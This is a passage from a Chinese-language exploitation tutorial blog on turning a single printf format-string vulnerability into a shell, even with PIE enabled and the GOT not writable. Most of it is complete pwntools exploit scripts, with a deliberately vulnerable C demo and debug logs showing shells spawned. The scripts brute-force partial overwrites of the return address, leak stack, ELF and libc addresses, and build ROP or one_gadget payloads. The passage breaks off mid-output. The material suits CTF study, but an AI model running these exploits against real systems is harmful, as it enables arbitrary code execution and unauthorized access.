class="line">call_read = <span class="number">0x400c03</span></span><br><span class="line">puts_str = <span class="number">0x400bf7</span></span><br><span class="line">ret_addr = <span class="number">0x400c2a</span></span><br><span class="line"><span class="comment"># 14$-stack_addr </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bomb</span>():</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;one printf&#x27;</span>)</span><br><span class="line">    payload = <span class="string">&#x27;%&#123;&#125;c&#x27;</span>.<span class="built_in">format</span>(<span class="number">0xbc2</span>).encode() + <span class="string">b&#x27;%14$hn&#x27;</span> <span class="comment"># 尝试覆盖返回地址为后门函数</span></span><br><span class="line">    payload = payload.ljust(<span class="number">0x40</span>, <span class="string">b&#x27;\x00&#x27;</span>) + <span class="string">b&#x27;\x18\xdb&#x27;</span> <span class="comment"># 覆盖低两字节，理论上这两字节随便填，只需要0x8字节对齐</span></span><br><span class="line">    io.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>: <span class="comment"># 爆破</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        io = start()</span><br><span class="line">        bomb()</span><br><span class="line">        io.sendline(<span class="string">b&#x27;whoami&#x27;</span>)</span><br><span class="line">        io.recvuntil(<span class="string">b&#x27;r3t2&#x27;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        io.close()</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>爆破成功后效果如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">[DEBUG] Received 0xb bytes:</span><br><span class="line">    b&#x27;one printf\n&#x27;</span><br><span class="line">[DEBUG] Sent 0x42 bytes:</span><br><span class="line">    00000000  25 33 30 31  30 63 25 31  34 24 68 6e  00 00 00 00  │%301│0c%1│4$hn│····│</span><br><span class="line">    00000010  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│</span><br><span class="line">    *</span><br><span class="line">    00000040  08 aa                                               │··│</span><br><span class="line">    00000042</span><br><span class="line">[DEBUG] Sent 0x7 bytes:</span><br><span class="line">    b&#x27;whoami\n&#x27;</span><br><span class="line">[DEBUG] Received 0xbc2 bytes:</span><br><span class="line">    00000000  20 20 20 20  20 20 20 20  20 20 20 20  20 20 20 20  │    │    │    │    │</span><br><span class="line">    *</span><br><span class="line">    00000bc0  20 10                                               │ ·│</span><br><span class="line">    00000bc2</span><br><span class="line">[DEBUG] Received 0x5 bytes:</span><br><span class="line">    b&#x27;r3t2\n&#x27;</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line"></span><br><span class="line">$</span><br></pre></td></tr></table></figure><h2 id="0x02-更加极限的情况"><a href="#0x02-更加极限的情况" class="headerlink" title="0x02 更加极限的情况"></a>0x02 更加极限的情况</h2><p>如果不是静态链接，没有后门函数，其实也区别不大<br>我们设想一种情况，<code>got</code>不可写，开启<code>PIE</code>，无后门函数，还是只有一次栈上格串机会，怎么办呢？<br>其实和上面思路类似，尽管<code>elf_base</code>，<code>libc_base</code>，栈地址全部不知道，但是我们有：</p><ul><li>程序地址的低字节</li><li>输入位于栈上</li></ul><p>和上面类似的思路，如果在输入可以达到的地方能找到一个栈地址，我们就可以爆破其低一字节或者两字节，覆盖为返回地址的栈上地址，然后修改返回地址的低字节，回到<code>printf</code>之前，先泄露了<code>elf_base</code>，<code>libc_base</code>以及栈地址，那么就可以利用我们创造的第二次格串利用机会来<code>getshell</code><br>多说无益，我们上手<strong>实操</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BUFLEN  0x60</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 为了演示ROP而加入，而不是说一定需要这样的gadget才能完成攻击</span></span><br><span class="line">__attribute__((naked, noinline, used, visibility(<span class="string">&quot;default&quot;</span>)))</span><br><span class="line"><span class="type">void</span> <span class="title function_">gadget</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">  __asm__ __volatile__(</span><br><span class="line">    <span class="string">&quot;pop %r10\n\t&quot;</span></span><br><span class="line">    <span class="string">&quot;pop %r11\n\t&quot;</span></span><br><span class="line">    <span class="string">&quot;pop %r12\n\t&quot;</span></span><br><span class="line">    <span class="string">&quot;ret\n\t&quot;</span></span><br><span class="line">  );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">init_func</span><span class="params">()</span>&#123;</span><br><span class="line">    setvbuf(<span class="built_in">stdin</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stderr</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">int</span> <span class="title function_">dofunc</span><span class="params">()</span>&#123;</span><br><span class="line">  <span class="type">char</span> buf[BUFLEN];</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;input&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, BUFLEN);</span><br><span class="line">  <span class="built_in">printf</span>(buf);</span><br><span class="line">  _exit(<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">  init_func();</span><br><span class="line">  dofunc();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// gcc pwn.c -o pwn </span></span><br><span class="line"><span class="comment">// glibc2.35</span></span><br></pre></td></tr></table></figure><p>为了方便演示<code>ROP</code>，加入了<code>pop r10 ; pop r11 ; pop r12 ; ret</code>，如果使用<code>one_gadget</code>则不需要<br>这次我们要修改<code>printf</code>的返回地址，第一次爆破成功泄露栈地址，<code>elf_base</code>以及<code>libc_base</code>，后续修改<code>printf</code>返回地址为<code>one_gadget</code>，又或者是在栈上布置<code>ROP</code>链皆可<br>打<code>ROP</code>的exp如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">filename = <span class="string">&quot;pwn&quot;</span></span><br><span class="line">libcname = <span class="string">&quot;/home/r3t2/.config/cpwn/pkgs/2.35-0ubuntu3.10/amd64/libc6_2.35-0ubuntu3.10_amd64/lib/x86_64-linux-gnu/libc.so.6&quot;</span></span><br><span class="line">host = <span class="string">&quot;127.0.0.1&quot;</span></span><br><span class="line">port = <span class="number">1337</span></span><br><span class="line">elf = context.binary = ELF(filename)</span><br><span class="line"><span class="keyword">if</span> libcname:</span><br><span class="line">    libc = ELF(libcname)</span><br><span class="line">gs = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">b printf</span></span><br><span class="line"><span class="string">set debug-file-directory /home/r3t2/.config/cpwn/pkgs/2.35-0ubuntu3.10/amd64/libc6-dbg_2.35-0ubuntu3.10_amd64/usr/lib/debug</span></span><br><span class="line"><span class="string">set directories /home/r3t2/.config/cpwn/pkgs/2.35-0ubuntu3.10/amd64/glibc-source_2.35-0ubuntu3.10_all/usr/src/glibc/glibc-2.35</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">start</span>():</span><br><span class="line">    <span class="keyword">if</span> args.P:</span><br><span class="line">        <span class="keyword">return</span> process(elf.path)</span><br><span class="line">    <span class="keyword">elif</span> args.R:</span><br><span class="line">        <span class="keyword">return</span> remote(host, port)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> gdb.debug(elf.path, gdbscript = gs)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 23$ --&gt; __libc_start_call_main+128 21$ --&gt; main+28 20$ --&gt; stack_addr</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bomb</span>():</span><br><span class="line">    payload = <span class="string">b&quot;%20$p%21$p%23$pa&quot;</span></span><br><span class="line">    payload += <span class="string">&#x27;%&#123;&#125;c&#x27;</span>.<span class="built_in">format</span>(<span class="number">0x5b</span> - <span class="number">0x2b</span>).encode() + <span class="string">b&#x27;%15$hhn&#x27;</span></span><br><span class="line">    payload = payload.ljust(<span class="number">0x48</span>, <span class="string">b&#x27;\x00&#x27;</span>) + <span class="string">b&#x27;\x68&#x27;</span></span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;input&#x27;</span>)</span><br><span class="line">    io.send(payload)</span><br><span class="line">    <span class="keyword">global</span> elf_base</span><br><span class="line">    <span class="keyword">global</span> libc_base</span><br><span class="line">    <span class="keyword">global</span> stack_addr</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">    stack_addr = <span class="built_in">int</span>(io.recv(<span class="number">12</span>), <span class="number">16</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">    elf_base = <span class="built_in">int</span>(io.recv(<span class="number">12</span>), <span class="number">16</span>) - <span class="number">28</span> - elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">    libc_base = <span class="built_in">int</span>(io.recv(<span class="number">12</span>), <span class="number">16</span>) + <span class="number">0xb0</span> - <span class="number">128</span> - libc.sym[<span class="string">&#x27;__libc_start_main&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        io = start()</span><br><span class="line">        bomb()</span><br><span class="line">        io.recvuntil(<span class="string">b&#x27;input&#x27;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        io.close()</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">log.info(<span class="string">&quot;stack_addr --&gt; &quot;</span>+<span class="built_in">hex</span>(stack_addr))</span><br><span class="line">log.info(<span class="string">&quot;elf_base --&gt; &quot;</span>+<span class="built_in">hex</span>(elf_base))</span><br><span class="line">log.info(<span class="string">&quot;libc_base --&gt; &quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">pop = elf_base + <span class="number">0x11cd</span> <span class="comment"># pop r10 ; pop r11 ; pop r12 ; ret</span></span><br><span class="line">pop_rdi_ret = libc_base + <span class="number">0x2a3e5</span></span><br><span class="line">ret = pop_rdi_ret + <span class="number">1</span></span><br><span class="line">binsh = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">printf_ret = stack_addr - <span class="number">0x88</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;%&#123;&#125;c&#x27;</span>.<span class="built_in">format</span>((elf_base &amp; <span class="number">0xffff</span>) + <span class="number">0x11cd</span>).encode() + <span class="string">b&#x27;%8$hn&#x27;</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x10</span>, <span class="string">b&#x27;a&#x27;</span>) </span><br><span class="line">payload += p64(printf_ret)</span><br><span class="line">payload += p64(pop_rdi_ret) + p64(binsh) + p64(ret) + p64(system)</span><br><span class="line"></span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>效果</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">                                                               $                                                                               [DEBUG] Received 0x1dc bytes:</span><br><span class="line">    00000000  20 20 20 20  20 20 20 20  20 20 20 20  20 20 20 20  │    │    │    │    │</span><br><span class="line">    *</span><br><span class="line">    000001d0  20 70 61 61  61 61 68 b3  c4 cd fd 7f               │ paa│aah·│····│</span><br><span class="line">    000001dc</span><br><span class="line">                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 paaaah\xb3\xc4\xcd\xfd\x7f$                                                                                   w                                                                                                                                               wh                                                                                                                                              who                                                                                                                                             whoa                                                                                                                                            whoam                                                                                                                                           whoami                                                                                                                                          whoami</span><br><span class="line">[DEBUG] Sent 0x7 bytes:</span><br><span class="line">    b&#x27;whoami\n&#x27;</span><br><span class="line">[DEBUG] Received 0x5 bytes:</span><br><span class="line">    b&#x27;r3t2\n&#x27;</span><br><span class="line">r3t2</span><br><span class="line">$</span><br></pre></td></tr></table></figure><p>打<code>one_gadget</code>的exp如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">filename = <span class="string">&quot;pwn&quot;</span></span><br><span class="line">libcname = <span class="string">&quot;/home/r3t2/.config/cpwn/pkgs/2.35-0ubuntu3.10/amd64/libc6_2.35-0ubuntu3.10_amd64/lib/x86_64-linux-gnu/libc.so.6&quot;</span></span><br><span class="line">host = <span class="string">&quot;127.0.0.1&quot;</span></span><br><span class="line">port = <span class="number">1337</span></span><br><span class="line">elf = context.binary = ELF(filename)</span><br><span class="line"><span class="keyword">if</span> libcname:</span><br><span class="line">    libc = ELF(libcname)</span><br><span class="line">gs = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">b printf</span></span><br><span class="line"><span class="string">set debug-file-directory /home/r3t2/.config/cpwn/pkgs/2.35-0ubuntu3.10/amd64/libc6-dbg_2.35-0ubuntu3.10_amd64/usr/lib/debug</span></span><br><span class="line"><span class="string">set directories /home/r3t2/.config/cpwn/pkgs/2.35-0ubuntu3.10/amd64/glibc-source_2.35-0ubuntu3.10_all/usr/src/glibc/glibc-2.35</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">start</span>():</span><br><span class="line">    <span class="keyword">if</span> args.P:</span><br><span class="line">        <span class="keyword">return</span> process(elf.path)</span><br><span class="line">    <span class="keyword">elif</span> args.R:</span><br><span class="line">        <span class="keyword">return</span> remote(host, port)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> gdb.debug(elf.path, gdbscript = gs)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 23$ --&gt; __libc_start_call_main+128 21$ --&gt; main+28 20$ --&gt; stack_addr</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bomb</span>():</span><br><span class="line">    payload = <span class="string">b&quot;%20$p%21$p%23$pa&quot;</span></span><br><span class="line">    payload += <span class="string">&#x27;%&#123;&#125;c&#x27;</span>.<span class="built_in">format</span>(<span class="number">0x5b</span> - <span class="number">0x2b</span>).encode() + <span class="string">b&#x27;%15$hhn&#x27;</span></span><br><span class="line">    payload = payload.ljust(<span class="number">0x48</span>, <span class="string">b&#x27;\x00&#x27;</span>) + <span class="string">b&#x27;\x68&#x27;</span></span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;input&#x27;</span>)</span><br><span class="line">    io.send(payload)</span><br><span class="line">    <span class="keyword">global</span> elf_base</span><br><span class="line">    <span class="keyword">global</span> libc_base</span><br><span class="line">    <span class="keyword">global</span> stack_addr</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">    stack_addr = <span class="built_in">int</span>(io.recv(<span class="number">12</span>), <span class="number">16</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">    elf_base = <span class="built_in">int</span>(io.recv(<span class="number">12</span>), <span class="number">16</span>) - <span class="number">28</span> - elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">    libc_base = <span class="built_in">int</span>(io.recv(<span class="number">12</span>), <span class="number">16</span>) + <span class="number">0xb0</span> - <span class="number">128</span> - libc.sym[<span class="string">&#x27;__libc_start_main&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        io = start()</span><br><span class="line">        bomb()</span><br><span class="line">        io.recvuntil(<span class="string">b&#x27;input&#x27;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        io.close()</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">log.info(<span class="string">&quot;stack_addr --&gt; &quot;</span>+<span class="built_in">hex</span>(stack_addr))</span><br><span class="line">log.info(<span class="string">&quot;elf_base --&gt; &quot;</span>+<span class="built_in">hex</span>(elf_base))</span><br><span class="line">log.info(<span class="string">&quot;libc_base --&gt; &quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 0xebc81 execve(&quot;/bin/sh&quot;, r10, [rbp-0x70])</span></span><br><span class="line"><span class="comment"># constraints:</span></span><br><span class="line"><span class="comment">#   address rbp-0x78 is writable</span></span><br><span class="line"><span class="comment">#   [r10] == NULL || r10 == NULL || r10 is a valid argv</span></span><br><span class="line"><span class="comment">#   [[rbp-0x70]] == NULL || [rbp-0x70] == NULL || [rbp-0x70] is a valid envp</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 0xebc85 execve(&quot;/bin/sh&quot;, r10, rdx)</span></span><br><span class="line"><span class="comment"># constraints:</span></span><br><span class="line"><span class="comment">#   address rbp-0x78 is writable</span></span><br><span class="line"><span class="comment">#   [r10] == NULL || r10 == NULL || r10 is a valid argv</span></span><br><span class="line"><span class="comment">#   [rdx] == NULL || rdx == NULL || rdx is a valid envp</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 0xebc88 execve(&quot;/bin/sh&quot;, rsi, rdx)</span></span><br><span class="line"><span class="comment"># constraints:</span></span><br><span class="line"><span class="comment">#   address rbp-0x78 is writable</span></span><br><span class="line"><span class="comment">#   [rsi] == NULL || rsi == NULL || rsi is a valid argv</span></span><br><span class="line"><span class="comment">#   [rdx] == NULL || rdx == NULL || rdx is a valid envp</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 0xebce2 execve(&quot;/bin/sh&quot;, rbp-0x50, r12)</span></span><br><span class="line"><span class="comment"># constraints:</span></span><br><span class="line"><span class="comment">#   address rbp-0x48 is writable</span></span><br><span class="line"><span class="comment">#   r13 == NULL || &#123;&quot;/bin/sh&quot;, r13, NULL&#125; is a valid argv</span></span><br><span class="line"><span class="comment">#   [r12] == NULL || r12 == NULL || r12 is a valid envp</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 0xebd38 execve(&quot;/bin/sh&quot;, rbp-0x50, [rbp-0x70])</span></span><br><span class="line"><span class="comment"># constraints:</span></span><br><span class="line"><span class="comment">#   address rbp-0x48 is writable</span></span><br><span class="line"><span class="comment">#   r12 == NULL || &#123;&quot;/bin/sh&quot;, r12, NULL&#125; is a valid argv</span></span><br><span class="line"><span class="comment">#   [[rbp-0x70]] == NULL || [rbp-0x70] == NULL || [rbp-0x70] is a valid envp</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 0xebd3f execve(&quot;/bin/sh&quot;, rbp-0x50, [rbp-0x70])</span></span><br><span class="line"><span class="comment"># constraints:</span></span><br><span class="line"><span class="comment">#   address rbp-0x48 is writable</span></span><br><span class="line"><span class="comment">#   rax == NULL || &#123;rax, r12, NULL&#125; is a valid argv</span></span><br><span class="line"><span class="comment">#   [[rbp-0x70]] == NULL || [rbp-0x70] == NULL || [rbp-0x70] is a valid envp</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 0xebd43 execve(&quot;/bin/sh&quot;, rbp-0x50, [rbp-0x70])</span></span><br><span class="line"><span class="comment"># constraints:</span></span><br><span class="line"><span class="comment">#   address rbp-0x50 is writable</span></span><br><span class="line"><span class="comment">#   rax == NULL || &#123;rax, [rbp-0x48], NULL&#125; is a valid argv</span></span><br><span class="line"><span class="comment">#   [[rbp-0x70]] == NULL || [rbp-0x70] == NULL || [rbp-0x70] is a valid envp</span></span><br><span class="line"></span><br><span class="line">one_gadget = libc_base + <span class="number">0xebc85</span></span><br><span class="line">printf_ret = stack_addr - <span class="number">0x88</span></span><br><span class="line"></span><br><span class="line">var1 = one_gadget &amp; <span class="number">0xffff</span></span><br><span class="line">var2 = ((one_gadget &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xffff</span>) - var1 + <span class="number">0x10000</span></span><br><span class="line">var3 = ((one_gadget &gt;&gt; <span class="number">32</span>) &amp; <span class="number">0xffff</span>) - var1 - var2 + <span class="number">0x20000</span></span><br><span class="line">var4 = ((one_gadget &gt;&gt; <span class="number">48</span>) &amp; <span class="number">0xffff</span>) - var1 - var2 - var3 + <span class="number">0x30000</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;%&#123;&#125;c&#x27;</span>.<span class="built_in">format</span>(var1).encode() + <span class="string">b&#x27;%13$hn&#x27;</span></span><br><span class="line">payload += <span class="string">&#x27;%&#123;&#125;c&#x27;</span>.<span class="built_in">format</span>(var2).encode() + <span class="string">b&#x27;%14$hn&#x27;</span></span><br><span class="line">payload += <span class="string">&#x27;%&#123;&#125;c&#x27;</span>.<span class="built_in">format</span>(var3).encode() + <span class="string">b&#x27;%15$hn&#x27;</span></span><br><span class="line">payload += <span class="string">&#x27;%&#123;&#125;c&#x27;</span>.<span class="built_in">format</span>(var4).encode() + <span class="string">b&#x27;%16$hn&#x27;</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x38</span>, <span class="string">b&#x27;a&#x27;</span>) + p64(printf_ret) + \</span><br><span class="line">        p64(printf_ret + <span class="number">2</span>) + p64(printf_ret + <span class="number">4</span>) + p64(printf_ret + <span class="number">6</span>)</span><br><span class="line"></span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>效果</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">                                                               $                                                                               [DEBUG] Received 0x3a bytes:</span><br><span class="line">    00000000  20 20 20 20  20 20 20 20  20 20 20 20  20 20 20 20  │    │    │    │    │</span><br><span class="line">    *</span><br><span class="line">    00000020  20 20 20 20  20 